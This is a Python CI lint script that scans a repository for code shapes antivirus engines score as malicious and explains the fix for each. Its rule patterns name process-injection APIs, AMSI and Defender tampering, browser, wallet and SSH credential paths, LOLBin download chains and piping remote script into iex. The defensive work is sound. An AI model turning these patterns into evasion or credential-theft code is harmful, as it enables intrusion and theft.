#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-only
# Copyright 2026-present the Unsloth AI Inc. team. All rights reserved.
"""Fail CI when a change adds a code shape that heuristic scanners quarantine.

Every recent false positive on this repository came from our own files, not from
anything malicious: a test that wrote a PowerShell probe declaring a kernel32 import,
a supply-chain scanner whose credential-path list sat next to network code, reflection
emit in the installer, a System32 tool copied under another name, and a text file
named .exe that a test then started. tests/studio/test_installer_av_shapes.py pins
the shapes for the seven shipped installers; this gate carries the same idea to every
tracked script-bearing file, so the shape is caught at review time instead of on a
user's machine.

It matches shapes, not verdicts. It cannot predict what a vendor engine decides, and
it is not meant to: it catches the constructs those engines are known to score, says
why, and says what to write instead.

Existing sites are recorded in scripts/av_shapes_baseline.json, keyed on the matched
line's text rather than its number, with a count, so only new occurrences fail.
Errors in the baseline need a written reason; warnings never fail the build.

    python scripts/lint_av_shapes.py              # check, exit 1 on a new error
    python scripts/lint_av_shapes.py --update     # rewrite the baseline, keeping reasons
    python scripts/lint_av_shapes.py --self-test  # prove every rule still fires
    python scripts/lint_av_shapes.py --paths a.ps1 b.py   # just these files

A single line can be excused with `lint-allow: AV0NN <reason>` on it or on the line
above, except in the shipped installers, where only the baseline counts.

The trigger tokens below are assembled from fragments, the same way
scripts/scan_packages.py builds its signature strings, so this file does not itself
carry the shapes it looks for.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import re
import subprocess
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Callable

REPO_ROOT = Path(__file__).resolve().parents[1]
BASELINE_PATH = Path(__file__).resolve().parent / "av_shapes_baseline.json"

SUFFIXES = (
    ".ps1", ".psm1", ".psd1", ".bat", ".cmd", ".sh", ".py",
    ".rs", ".js", ".mjs", ".cjs", ".ts", ".tsx", ".yml", ".yaml",
)  # fmt: skip
POWERSHELL_LIKE = (".ps1", ".psm1", ".psd1", ".bat", ".cmd")
# Where a PowerShell launch or a Windows process start can be written: not the web frontend.
LAUNCHERS = POWERSHELL_LIKE + (".sh", ".py", ".rs", ".yml", ".yaml")
SHIPPED_INSTALLERS = frozenset(
    {
        "install.ps1",
        "install.sh",
        "studio/setup.ps1",
        "studio/setup.sh",
        "studio/setup.bat",
        "scripts/uninstall.ps1",
        "scripts/uninstall.sh",
    }
)
EXCLUDED_PARTS = frozenset({"node_modules", "vendor", "dist", "build", "__pycache__", ".git"})
EXCLUDED_PREFIXES = ("studio/backend/assets/docs_ui/",)
MAX_BYTES = 4_000_000  # minified bundles and generated blobs; nothing hand-written is this large

_J = "".join


def _any(*words: str) -> str:
    return "(?:" + "|".join(words) + ")"


# ---- trigger vocabulary, built from fragments -------------------------------------------------
_DLLIMPORT = _J(("Dll", "Import"))
_MEM_APIS = [
    _J(p)
    for p in (
        ("Virtual", "Alloc(?:Ex)?"),
        ("Virtual", "Protect(?:Ex)?"),
        ("Write", "Process", "Memory"),
        ("Create", "Remote", "Thread(?:Ex)?"),
        ("Nt", "Create", "Thread", "Ex"),
        ("Queue", "User", "APC"),
        ("Set", "Windows", "Hook", "Ex[AW]?"),
        ("Nt", "Unmap", "View", "Of", "Section"),
    )
]
_EMIT = [
    _J(p)
    for p in (
        ("Define", "Dynamic", "Assembly"),
        ("Define", "PInvoke", "Method"),
        (r"\b", "Type", "Builder", r"\b"),
        (r"\b", "Assembly", "Builder", r"\b"),
    )
]
_ENC_CMD = _J(("-Encoded", "Command"))
_FROM_B64 = _J(("From", "Base64", "String"))
_IEX = _any(_J(("i", "ex")), _J(("Invoke", "-Expression")))
_DOWNLOADERS = _any(
    _J(("i", "rm")), _J(("i", "wr")), _J(("Invoke", "-RestMethod")), _J(("Invoke", "-WebRequest")),
    _J(("Download", "String")), _J(("New", "-Object")),
)  # fmt: skip
_TAMPER = [
    _J(p)
    for p in (
        ("amsi", "Init", "Failed"),
        ("Amsi", "Scan", "Buffer"),
        ("Amsi", "Utils"),
        # Changing a setting, not reading it, and not switching protection back on.
        (
            "Set",
            "-Mp",
            r"Preference\b[^\n]*-Disable\w*(?::\s*\$true|:\s*1\b|(?!\s+\$false)(?:\s+\$true|\s+1\b|\s*$|\s+`))",
        ),
        (r"(?:Add|Set)", "-Mp", r"Preference\b[^\n]*-Exclusion"),
    )
]
_HIDDEN = _J((r"-Window", r"Style(?:\s+|\s*:\s*)", "Hidden"))
_BYPASS = _J((r"-Execution", r"Policy(?:\s+|\s*:\s*)", "(?:By", "pass|Unre", "stricted)"))
_BYPASS_ARRAY = _J(
    (r"['\"]-Execution", r"Policy['\"]\s*,\s*['\"](?:By", "pass|Unre", r"stricted)['\"]")
)
# Product and profile names stay case-sensitive: "local state" and "local storage" are ordinary
# prose in the frontend. File paths are matched in any case, as Windows resolves them.
_CRED_NAMES = [
    _J(p)
    for p in (
        ("Login", " Data"),
        ("Local", " State"),
        ("Web", " Data"),
        (r"\bElec", r"trum\b"),
        (r"\bExo", r"dus\b"),
        ("Meta", "Mask"),
        (r"\bt", r"data\b"),
        ("Local", " Storage"),
    )
]
_CRED_MARKERS = [
    _J(p)
    for p in (
        ("wallet", r"\.dat"),
        (r"\bid_", r"(?:rsa|ed25519|ecdsa)\b"),
        ("key4", r"\.db"),
        ("logins", r"\.json"),
        (r"\.git-", "credentials"),
        ("/etc/", "shadow"),
        (r"\.(?:bit", "coin|ethe", "reum|sol", "ana|mon", r"ero)[/\\][A-Za-z_]{3,}"),
        ("key", r"store[/\\]UTC--"),
        (r"\bseed", r"\s*phrase\b"),
        (r"\bx", r"prv\b"),
        (r"\.aws[/\\]", "credentials"),
        (r"\.gnu", r"pg[/\\]"),
    )
]
_ENV_ACCESS = (
    r"os\.environ|getenv\(|process\.env|\$env:|%(?:LOCAL)?APPDATA%|expanduser\(|\$\{?HOME\b|~/\."
)
_NETWORK = (
    r"\brequests\.|urllib\.request|urlopen\(|http\.client|\bhttpx\.|socket\.socket|\bfetch\("
    r"|Invoke-WebRequest|Invoke-RestMethod|WebClient|aiohttp|^\s*(?:curl|wget)\s"
)
_SYSDIR = r"(?i)\b(?:System32|SysWOW64)\b"
_COPY_CALL = (
    r"(?i)(?<![\w.])copy(?:file|2)?\s*\(|shutil\.copy\w*\s*\(|\bCopy-Item\b"
    r"|\[(?:System\.)?IO\.File\]::Copy\s*\(|\bCopyFileW?\s*\(|fs::copy\s*\("
)
_SHELL_COPY = r"(?i)^\s*(?:cp|copy)\s"
_WRITE_CALL = r"(?:write_bytes|write_text)\((?P<args>[^\n]*)|Set-Content\b(?P<ps>[^\n]*)"
_NON_MZ_LITERAL = r"""(?<![\w'"])b?(['"])(?!MZ)[^'"\n]{0,80}\1"""
_STARTS_PROCESS = r"subprocess\.|Popen\(|run_pwsh\(|Start-Process\b|os\.startfile|run_step\("
_LOLBIN = [
    _J(p)
    for p in (
        (r"\bcert", r"util(?:\.exe)?['\"]?\s+[^\n]*-(?:url", "cache|de", "code)"),
        (r"\bbits", r"admin(?:\.exe)?['\"]?\s+/trans", "fer"),
        (r"\bms", r"hta(?:\.exe)?['\"]?\s+['\"]?(?:https?|vb", "script|java", "script):"),
        (r"\bregsvr", r"32(?:\.exe)?['\"]?\s+[^\n]*/i:\s*['\"]?https?:"),
        (r"\brun", r"dll32(?:\.exe)?['\"]?\s+java", "script:"),
    )
]
_PERSIST = [
    _J(p)
    for p in (
        (r"\bsch", r"tasks(?:\.exe)?\s+/create"),
        ("Register", "-Scheduled", "Task"),
        (r"Current", r"Version\\\\?Run\b"),
        ("shell:", "startup"),
    )
]
_OBFUSCATION = [
    r"-join\s*\[char\[\]\]",
    r"\[char\[\]\]\s*\(\s*\d+\s*,\s*\d+",
    r"-bxor\b",
    r"\b[A-Za-z]+`[A-Za-z]+-[A-Za-z`]+",  # backtick-split cmdlet names
    r"[A-Za-z0-9+/]{200,}={0,2}",  # an inline base64 blob
]
_VENDOR_PROSE = _any(
    r"\banti-?virus", r"\bAMSI\b", r"\bDefender\b", _J(("Bit", "defender")), r"\bevad(?:e|ing)\b",
    r"\bevasion\b", r"\bheuristic", r"\bquarantin", r"\bmalware\b",
)  # fmt: skip

ALLOW_RE = re.compile(r"lint-allow:\s*(AV\d{3})\s+(\S.{8,})")


@dataclass
class Finding:
    rule: str
    file: str
    line: int
    text: str
    severity: str

    @property
    def digest(self) -> str:
        return hashlib.sha256(" ".join(self.text.split()).encode()).hexdigest()[:16]


@dataclass
class Rule:
    id: str
    severity: str
    what: str
    why: str
    fix: str
    applies: Callable[[str], bool] = lambda path: True
    line_patterns: list = field(default_factory = list)
    check: Callable | None = None  # (path, lines, text) -> list[(line_no, severity)]
    comments_count: bool = True  # scanners read comments too, so most rules do not skip them
    needles: tuple = ()  # lowercase substrings; a file holding none of them cannot match, so it is not scanned


def _is_comment(line: str) -> bool:
    stripped = line.lstrip()
    return stripped.startswith(("#", "//", "::", "REM ", "rem ", "<#", "*", '"""', "'''"))


def _window(
    lines: list[str],
    index: int,
    before: int,
    after: int = 0,
) -> list[str]:
    return lines[max(0, index - before) : index + after + 1]


def _check_hidden_bypass(path, lines, text):
    hidden, bypass, array = (
        re.compile(_HIDDEN, re.I),
        re.compile(_BYPASS, re.I),
        re.compile(_BYPASS_ARRAY, re.I),
    )
    hidden_array = re.compile(r"(?i)['\"]-WindowStyle['\"]\s*,\s*['\"]Hidden['\"]")

    def joined(i: int) -> str:
        # An argv list formatted one element per line: `"-WindowStyle",` then `"Hidden",`.
        return " ".join(x.strip().strip(",").strip("'\"") for x in _window(lines, i, 3, 3))

    out = []
    for i, line in enumerate(lines):
        split_hidden = re.search(r"(?i)^\W*hidden\W*$", line) and hidden.search(joined(i))
        if not (hidden.search(line) or hidden_array.search(line) or split_hidden):
            continue
        near = _window(lines, i, 3, 3)
        if any(bypass.search(x) or array.search(x) for x in near) or bypass.search(joined(i)):
            out.append((i + 1, "error"))
    return out


_ENC_LAUNCH = [
    re.compile(r"(?i)" + _ENC_CMD + r"\b"),
    re.compile(
        r"(?i)\b(?:powershell|pwsh)(?:\.exe)?\b[^\n]*\s-(?:ec|e(?:n(?:c(?:o(?:d(?:e(?:d(?:c(?:o(?:m(?:m(?:a(?:nd?)?)?)?)?)?)?)?)?)?)?)?)?)"
        r"[\s:]+['\"]?[A-Za-z0-9+/=]{16,}"
    ),
    # Decoded text piped into something that runs it; `| tar` or `> file` is data.
    re.compile(
        r"(?i)\bbase64\s+(?:-d|--decode)\b[^\n]*\|\s*(?:sudo\s+)?(?:(?:ba|z|da)?sh|python\d*|pwsh|powershell|node|perl|"
        + _IEX
        + r")\b"
    ),
]
_RUNS_TEXT = re.compile(
    r"(?i)\b" + _IEX + r"\b|\[scriptblock\]::Create|Reflection\.Assembly\]::Load|" + _ENC_CMD
)


def _check_encoded(path, lines, text):
    from_b64 = re.compile(_FROM_B64, re.I)
    out = []
    for i, line in enumerate(lines):
        if any(p.search(line) for p in _ENC_LAUNCH):
            out.append((i + 1, "error"))
        elif from_b64.search(line):
            # Decoding a certificate or an archive is data; feeding the result to the engine is not.
            runs = any(_RUNS_TEXT.search(x) for x in _window(lines, i, 0, 3))
            out.append((i + 1, "error" if runs else "warn"))
    return out


def _check_credentials(path, lines, text):
    if not re.search(_ENV_ACCESS, text, re.I) or not re.search(_NETWORK, text, re.I | re.M):
        return []
    markers = [re.compile(m) for m in _CRED_NAMES] + [re.compile(m, re.I) for m in _CRED_MARKERS]
    # Distinct credentials, not distinct patterns: id_rsa and id_ed25519 are two keys.
    present = {hit.group(0).lower() for m in markers for hit in m.finditer(text)}
    if not present:
        return []
    severity = "error" if len(present) >= 2 else "warn"
    out = []
    for i, line in enumerate(lines):
        if any(m.search(line) for m in markers):
            out.append((i + 1, severity))
    return out


def _check_system_copy(path, lines, text):
    sysdir, copy_call, shell_copy = (
        re.compile(_SYSDIR),
        re.compile(_COPY_CALL),
        re.compile(_SHELL_COPY),
    )
    out = []
    for i, line in enumerate(lines):
        if _is_comment(line):
            continue
        is_copy = copy_call.search(line) or (
            path.endswith((".sh", ".yml", ".yaml") + POWERSHELL_LIKE) and shell_copy.search(line)
        )
        if not is_copy:
            continue
        # The source may sit on the lines after a call split across several.
        near = [x for x in _window(lines, i, 12, 3) if not _is_comment(x)]
        if any(sysdir.search(x) for x in near):
            out.append((i + 1, "error"))
    if path.endswith(".py"):
        out.extend(_system_copy_through_a_helper(text, sysdir))
    return sorted(set(out))


def _system_copy_through_a_helper(text, sysdir):
    """A System32 path handed to a function of this file that copies its argument.

    The signing test did exactly this: the copy sat in a small helper and the System32
    path only appeared at the call site, far from any copy call.
    """
    import ast

    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, RecursionError):
        return []
    copiers = set()
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            for call in ast.walk(node):
                if isinstance(call, ast.Call):
                    name = getattr(call.func, "attr", None) or getattr(call.func, "id", None) or ""
                    if name in ("copy", "copy2", "copyfile", "copytree"):
                        copiers.add(node.name)
                        break
    out = []
    for node in ast.walk(tree):
        if isinstance(node, ast.Call) and getattr(node.func, "id", None) in copiers:
            segment = ast.get_source_segment(text, node) or ""
            if sysdir.search(segment):
                out.append((node.lineno, "error"))
    return out


def _check_non_pe_exe(path, lines, text):
    # A PowerShell test dot-sources installer functions, and those do the starting.
    if not path.endswith(POWERSHELL_LIKE) and not re.search(_STARTS_PROCESS, text):
        return []
    write, literal = re.compile(_WRITE_CALL), re.compile(_NON_MZ_LITERAL)
    out = []
    for i, line in enumerate(lines):
        match = write.search(line)
        if not match:
            continue
        args = match.group("args") if match.group("args") is not None else match.group("ps")
        if not literal.search(args) or re.search(r"\bb?['\"]MZ", args):
            continue
        if re.search(r"(?i)\.exe\b", line) or any(
            re.search(r"(?i)\.exe['\"]", x) for x in _window(lines, i, 20)
        ):
            out.append((i + 1, "warn"))
    return out


# Our own documented one-liner is printed and quoted all over the repository; it is the user's
# command to run, not something these files execute. Anything else piped into the engine is flagged.
_FIRST_PARTY = re.compile(
    r"(?i)https?://(?:(?:www\.)?unsloth\.ai|raw\.githubusercontent\.com/unslothai|github\.com/unslothai)/"
)


def _inside_literal(line: str, position: int) -> bool:
    """Whether `position` falls inside a quoted string or backtick span on this line."""
    return any(line[:position].count(quote) % 2 for quote in ('"', "'", "`"))


def _check_remote_exec(path, lines, text):
    piped = re.compile(r"(?i)(https?://[^\s|'\"`]+|\)|\$[\w:]+)['\"]?\s*(\|)\s*" + _IEX + r"\b")
    wrapped = re.compile(r"(?i)\b" + _IEX + r"\s*\(+\s*" + _DOWNLOADERS)
    # `irm <url> -UseBasicParsing | iex`: options between the download and the pipe.
    fetched = re.compile(
        r"(?i)\b"
        + _DOWNLOADERS
        + r"\s+(?:-\w+\s+)*['\"]?(?:https?://|\$)[^|\n]*(\|)\s*"
        + _IEX
        + r"\b"
    )
    out = []
    for i, line in enumerate(lines):
        # Only our own one-liner is excused, and only where it is text: a comment, or a
        # string that prints or quotes it. Executed, it is the same shape as anyone else's.
        quoted_doc = _is_comment(line)
        hit = False
        for match in piped.finditer(line):
            ours = _FIRST_PARTY.match(match.group(1)) is not None
            if not (ours and (quoted_doc or _inside_literal(line, match.start(2)))):
                hit = True
        for match in list(wrapped.finditer(line)) + list(fetched.finditer(line)):
            ours = _FIRST_PARTY.search(line) is not None
            if not (ours and (quoted_doc or _inside_literal(line, match.start()))):
                hit = True
        if hit:
            out.append((i + 1, "error"))
    return out


def _check_vendor_prose(path, lines, text):
    prose = re.compile(_VENDOR_PROSE, re.I)
    return [
        (i + 1, "warn") for i, line in enumerate(lines) if _is_comment(line) and prose.search(line)
    ]


RULES = [
    Rule(
        "AV001",
        "error",
        "declares a native Win32 import inside PowerShell / C# source (Add-Type with a native import attribute)",
        "a script that compiles C# and binds kernel32 at run time is how loaders are built, so it is scored on sight; "
        "a test probe with this one line was quarantined on real machines",
        "call the API from the Python or Rust host instead, or find the PowerShell / .NET equivalent; a test that needs "
        "the state should reach it from the harness, not from a script it writes to disk; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
        needles = (_DLLIMPORT.lower(),),
        line_patterns = [
            r"\[\s*(?:System\.Runtime\.InteropServices\.)?" + _DLLIMPORT + r"(?:Attribute)?\s*\("
        ],
    ),
    Rule(
        "AV002",
        "error",
        "references a process-memory or thread-injection API",
        "allocating, writing or starting code in another process is the injection pattern itself",
        "an installer or test never needs these; remove the call; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
        needles = tuple(
            _J(p)
            for p in (
                ("virtual", "alloc"),
                ("virtual", "protect"),
                ("process", "memory"),
                ("remote", "thread"),
                ("thread", "ex"),
                ("user", "apc"),
                ("windows", "hook"),
                ("unmap", "view"),
            )
        ),
        line_patterns = [r"\b" + _any(*_MEM_APIS) + r"\b"],
    ),
    Rule(
        "AV003",
        "error",
        "builds types at run time with reflection emit",
        "emitting assemblies and P/Invoke stubs in memory is scored like compiling them; it was removed from install.ps1 "
        "for exactly this reason",
        "use a cmdlet or an existing .NET API; if a native call is unavoidable, make it from the Rust or Python host; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
        needles = tuple(
            _J(p)
            for p in (
                ("define", "dynamic"),
                ("pinvoke", "method"),
                ("type", "builder"),
                ("assembly", "builder"),
            )
        ),
        line_patterns = [_any(*_EMIT)],
    ),
    Rule(
        "AV004",
        "error",
        "passes an encoded or base64-decoded payload to an interpreter",
        "an encoded command hides what runs, which is the reason scanners treat it as a staged payload",
        "pass a script file or plain -Command text; decode data only as data; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
        needles = (_ENC_CMD.lower(), "base64", "powershell", "pwsh"),
        applies = lambda p: p.endswith(LAUNCHERS),
        check = _check_encoded,
    ),
    Rule(
        "AV005",
        "error",
        "runs downloaded or string-built script text in-process",
        "remote text piped into the expression engine is the most heavily scored PowerShell construct there is",
        "download to a file, check a pinned digest, then run the file",
        needles = (_J(("i", "ex")), _J(("invoke", "-expression"))),
        check = _check_remote_exec,
    ),
    Rule(
        "AV006",
        "error",
        "touches a security product's settings or scan interface",
        "turning scanning off or reaching into its internals is defense evasion by definition",
        "remove it; never alter a security product from the installer or its tests; a test that asserts the shape is absent should build the token from fragments (for example 'Define' + 'PInvokeMethod') so the test file does not carry it",
        needles = (_J(("am", "si")), _J(("mp", "preference"))),
        line_patterns = [r"(?i)" + _any(*_TAMPER)],
    ),
    Rule(
        "AV007",
        "error",
        "pairs a hidden window with a bypassed execution policy",
        "that combination is the shape of a dropper launching its stage silently",
        "keep one: RemoteSigned with a visible or CREATE_NO_WINDOW spawn is enough",
        needles = ("hidden",),
        applies = lambda p: p.endswith(LAUNCHERS),
        check = _check_hidden_bypass,
    ),
    Rule(
        "AV008",
        "error",
        "keeps browser, wallet or key-store paths in the same file as environment and network access",
        "a file holding the paths a credential stealer reads, next to code that can reach the network, is what a "
        "stealer looks like; scripts/scan_packages.py was flagged for this",
        "build such strings at run time from fragments, or keep them in a data file away from network code",
        needles = tuple(
            _J(p)
            for p in (
                ("login", " data"),
                ("local", " state"),
                ("web", " data"),
                ("wallet", ".dat"),
                ("elec", "trum"),
                ("exo", "dus"),
                ("meta", "mask"),
                ("t", "data"),
                ("id_", "rsa"),
                ("key4", ".db"),
                ("logins", ".json"),
                ("local", " storage"),
                (".git-", "credentials"),
                ("/etc/", "shadow"),
                ("key", "store"),
                ("seed", " phrase"),
                ("x", "prv"),
                (".aws", ""),
                (".gnu", "pg"),
                ("id_", "ed25519"),
                ("id_", "ecdsa"),
                (".bit", "coin"),
                (".ethe", "reum"),
                (".sol", "ana"),
                (".mon", "ero"),
            )
        ),
        check = _check_credentials,
    ),
    Rule(
        "AV009",
        "error",
        "copies a Windows system binary",
        "a Microsoft-signed tool renamed to something else is a classic masquerading shape",
        "use tests/_shared/windows_console_stub.py, a pip-style launcher that runs anywhere and is not a system file",
        needles = ("system32", "syswow64"),
        check = _check_system_copy,
    ),
    Rule(
        "AV010",
        "warn",
        "writes non-PE bytes to a .exe path in a file that also starts processes",
        "if the file is ever started, Windows treats it as a DOS program and shows a modal "
        "'Unsupported 16-Bit Application' dialog on a desktop",
        "answer the loader's refusal without starting the file (see _windows_non_pe_is_refused_not_started in "
        "tests/studio/install/test_keep_install_backcompat_9979.py), or use the launcher stub for a real one",
        needles = (".exe",),
        applies = lambda p: p.endswith(LAUNCHERS),
        check = _check_non_pe_exe,
    ),
    Rule(
        "AV011",
        "error",
        "uses a built-in Windows tool to fetch, decode or run a payload",
        "these tools are the standard living-off-the-land download and execution chains",
        "use Invoke-WebRequest or curl to a file with a digest check",
        needles = tuple(
            _J(p)
            for p in (
                ("cert", "util"),
                ("bits", "admin"),
                ("ms", "hta"),
                ("regsvr", "32"),
                ("run", "dll32"),
            )
        ),
        line_patterns = [r"(?i)" + _any(*_LOLBIN)],
    ),
    Rule(
        "AV012",
        "warn",
        "creates a scheduled task, Run key or Startup entry",
        "silent persistence is scored even when the intent is benign",
        "prefer a foreground, user-initiated action; keep it out of the installer",
        needles = tuple(
            _J(p)
            for p in (
                ("sch", "tasks"),
                ("scheduled", "task"),
                ("current", "version"),
                ("shell:", "startup"),
            )
        ),
        line_patterns = [r"(?i)" + _any(*_PERSIST)],
    ),
    Rule(
        "AV013",
        "warn",
        "obfuscates PowerShell (char arrays, xor, backtick-split names or an inline base64 blob)",
        "obfuscation is scored because honest code has no reason to hide what it calls",
        "write the code plainly; ship binary data as a file, not an inline blob",
        applies = lambda p: p.endswith(POWERSHELL_LIKE),
        line_patterns = _OBFUSCATION,
    ),
    Rule(
        "AV014",
        "warn",
        "a comment in a shipped installer talks about scanners or detection",
        "the whole script, comments included, is classifier input; a scanner has quoted such a comment back as a reason "
        "for suspicion",
        "say what the code does in the script and keep the history in tests/studio/test_installer_av_shapes.py",
        applies = lambda p: p in SHIPPED_INSTALLERS,
        check = _check_vendor_prose,
        comments_count = True,
    ),
    Rule(
        "AV015",
        "warn",
        "builds a script block from a string, or pipes a download into a shell",
        "string-to-code conversion is scored, more so when the text came from the network",
        "load functions by dot-sourcing a file; download scripts to a file and verify a digest before running them",
        needles = ("scriptblock", "curl", "wget"),
        line_patterns = [
            r"(?i)\[scriptblock\]::Create\s*\(",
            r"(?i)\b(?:curl|wget)\b[^\n|]*\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b",
        ],
    ),
    Rule(
        "AV016",
        "error",
        "an inline interpreter one-liner unpacks an archive",
        "fetching an archive and unpacking it with a `-c` one-liner is the dropper shape; a vendor has scored "
        "install.sh as a downloader for exactly this line",
        "use the interpreter's own module entry point (python3 -m zipfile -e ARCHIVE DIR), unzip or tar",
        applies = lambda p: not p.endswith((".py", ".rs", ".js", ".mjs", ".cjs", ".ts", ".tsx")),
        needles = tuple(_J(p) for p in (("ext", "ract"), ("unpack_", "archive"))),
        # Options may take an argument (-W ignore) or be combined with the command flag (-Ic). The
        # call has to sit inside the quoted program (escaped quotes included, not a later command or
        # comment) after an archive name, so an HTML node's .extract() is not an archive.
        line_patterns = [
            r"(?i)\b(?:python[0-9.]*|py|node|perl|ruby)(?:\.exe)?"
            r"(?:\s+--?[\w-]+(?:\s+[^\s'\"-][^\s'\"]*)?)*?\s+-[a-z]*[ce]\s*(['\"])(?:\\.|(?!\1)[^\n])*?"
            + _any(
                r"(?:zip|tar|archive)(?:\\.|(?!\1)[^\n])*?(?:\.|->)"
                + _J(("ext", "ract"))
                + r"(?:all)?\s*\(",
                _J(("unpack_", "archive")),
            )
        ],
    ),
]
RULES_BY_ID = {rule.id: rule for rule in RULES}
# PowerShell resolves commands, members and parameters in any case, and so do Windows paths.
_COMPILED = {rule.id: [re.compile(p, re.I) for p in rule.line_patterns] for rule in RULES}


def scan_text(relative: str, text: str) -> list[Finding]:
    lines = text.splitlines()
    lower = text.lower()
    shipped = relative in SHIPPED_INSTALLERS
    found = []
    # A .PS1 runs exactly like a .ps1, so rules see the lower-cased name.
    folded = relative.lower()
    for rule in RULES:
        if not rule.applies(folded):
            continue
        if rule.needles and not any(n in lower for n in rule.needles):
            continue
        hits: list[tuple[int, str]] = []
        if rule.check is not None:
            hits = rule.check(folded, lines, text)
        else:
            patterns = _COMPILED[rule.id]
            if not any(p.search(text) for p in patterns):
                continue
            for i, line in enumerate(lines):
                if any(p.search(line) for p in patterns):
                    hits.append((i + 1, rule.severity))
        for number, severity in hits:
            line = lines[number - 1]
            if not shipped:
                allow = ALLOW_RE.search(line) or (number > 1 and ALLOW_RE.search(lines[number - 2]))
                if allow and allow.group(1) == rule.id:
                    continue
            found.append(Finding(rule.id, relative, number, line.strip(), severity))
    return found


def _tracked_files() -> list[str]:
    try:
        output = subprocess.run(
            ["git", "ls-files", "-z"], cwd = REPO_ROOT, capture_output = True, check = True
        ).stdout
        return [f for f in output.decode("utf-8", "replace").split("\0") if f]
    except (OSError, subprocess.CalledProcessError):
        return [p.relative_to(REPO_ROOT).as_posix() for p in REPO_ROOT.rglob("*") if p.is_file()]


def _in_scope(relative: str) -> bool:
    folded = relative.lower()
    if not folded.endswith(SUFFIXES) or folded.endswith(".min.js"):
        return False
    if EXCLUDED_PARTS & set(relative.split("/")[:-1]) or relative.startswith(EXCLUDED_PREFIXES):
        return False
    # This gate and its test describe every shape by construction.
    return relative not in ("scripts/lint_av_shapes.py", "tests/security/test_lint_av_shapes.py")


def _read(path: Path) -> str:
    """Decode the way PowerShell does: honour a BOM, and spot BOM-less UTF-16 by its NULs."""
    raw = path.read_bytes()
    if raw.startswith((b"\xff\xfe", b"\xfe\xff")):
        return raw.decode("utf-16", errors = "replace")
    if raw.startswith(b"\xef\xbb\xbf"):
        return raw[3:].decode("utf-8", errors = "replace")
    head = raw[:512]
    if len(head) >= 16 and head[1::2].count(0) > len(head) // 4:
        return raw.decode("utf-16-le", errors = "replace")
    return raw.decode("utf-8", errors = "replace")


def _scan_one(relative: str) -> list[Finding]:
    path = REPO_ROOT / relative
    if not path.is_file() or path.stat().st_size > MAX_BYTES:
        return []
    return scan_text(relative, _read(path))


def collect(paths: list[str] | None) -> list[Finding]:
    if paths:
        found = []
        for given in paths:
            path = Path(given) if Path(given).is_absolute() else Path.cwd() / given
            if not path.is_file():
                # A named file that is missing means less was checked than was asked for.
                raise SystemExit(f"{given}: does not exist, so nothing was checked")
            try:
                relative = path.resolve().relative_to(REPO_ROOT).as_posix()
            except ValueError:
                relative = path.as_posix()
            found.extend(scan_text(relative, _read(path)))
        return found
    candidates = [f for f in _tracked_files() if _in_scope(f)]
    # About 6000 files and 115 MB: one process per core keeps the whole-repo run to a few seconds.
    from concurrent.futures import ProcessPoolExecutor

    with ProcessPoolExecutor() as pool:
        results = pool.map(_scan_one, candidates, chunksize = 64)
        return [finding for chunk in results for finding in chunk]


def _counted(findings: list[Finding]) -> dict:
    counts: dict = {}
    for f in findings:
        key = (f.file, f.rule, f.digest)
        counts[key] = counts.get(key, 0) + 1
    return counts


def _load_baseline() -> dict:
    if not BASELINE_PATH.is_file():
        return {"_comment": "", "groups": []}
    return json.loads(BASELINE_PATH.read_text(encoding = "utf-8"))


def _allowed(document: dict) -> tuple[dict, dict, set]:
    """Baseline groups: one reason per (file, rule), digest -> count underneath.

    Returns the allowed counts, every group's reason, and the groups recorded as errors.
    """
    allowed, reasons, error_groups = {}, {}, set()
    for group in document.get("groups", []):
        key = (group["file"], group["rule"])
        reasons[key] = group.get("reason", "")
        if group.get("severity") == "error":
            error_groups.add(key)
        for digest, count in group["digests"].items():
            allowed[(group["file"], group["rule"], digest)] = count
    return allowed, reasons, error_groups


def _explain(f: Finding) -> str:
    rule = RULES_BY_ID[f.rule]
    return (
        f"{f.file}:{f.line}: [{f.rule}] {f.severity}: {rule.what}\n"
        f"    line: {f.text[:160]}\n"
        f"    why:  {rule.why}\n"
        f"    fix:  {rule.fix}\n"
    )


def main() -> int:
    parser = argparse.ArgumentParser(
        description = __doc__, formatter_class = argparse.RawDescriptionHelpFormatter
    )
    parser.add_argument(
        "--update", action = "store_true", help = "rewrite the baseline, keeping reasons"
    )
    parser.add_argument("--self-test", action = "store_true", help = "check every rule still fires")
    parser.add_argument(
        "--paths", nargs = "*", help = "scan these files instead of the whole repository"
    )
    parser.add_argument("--json", metavar = "FILE", help = "also write the findings as JSON")
    arguments = parser.parse_args()

    if arguments.self_test:
        return self_test()
    if arguments.update and arguments.paths:
        # The baseline covers the whole repository; rebuilding it from a few files would drop the rest.
        print("--update rewrites the whole baseline and cannot be combined with --paths")
        return 2

    try:
        findings = collect(arguments.paths)
    except (OSError, UnicodeError) as error:
        print(f"internal error: {error}")
        return 2
    document = _load_baseline()
    allowed, reasons, error_groups = _allowed(document)
    observed = _counted(findings)
    # Severity comes from what the lint sees now, not from the JSON, which is hand-edited.
    observed_errors = {(f.file, f.rule, f.digest) for f in findings if f.severity == "error"}
    error_groups |= {
        (file, rule) for file, rule, _ in observed_errors if (file, rule, _) in allowed
    }

    if arguments.update:
        severities = {
            (f.file, f.rule, f.digest): f.severity for f in findings if f.severity == "error"
        }
        groups: dict = {}
        for (file, rule, digest), count in sorted(observed.items()):
            group = groups.setdefault(
                (file, rule),
                {"file": file, "rule": rule, "severity": "warn",
                 "reason": reasons.get((file, rule)) or "REVIEW ME", "digests": {}},
            )  # fmt: skip
            group["digests"][digest] = count
            if severities.get((file, rule, digest)) == "error":
                group["severity"] = "error"
        for group in groups.values():
            # Only an error group has to be justified; a warning never fails the build.
            if group["severity"] == "warn" and group["reason"] == "REVIEW ME":
                group["reason"] = "pre-existing warning"
        document["groups"] = list(groups.values())
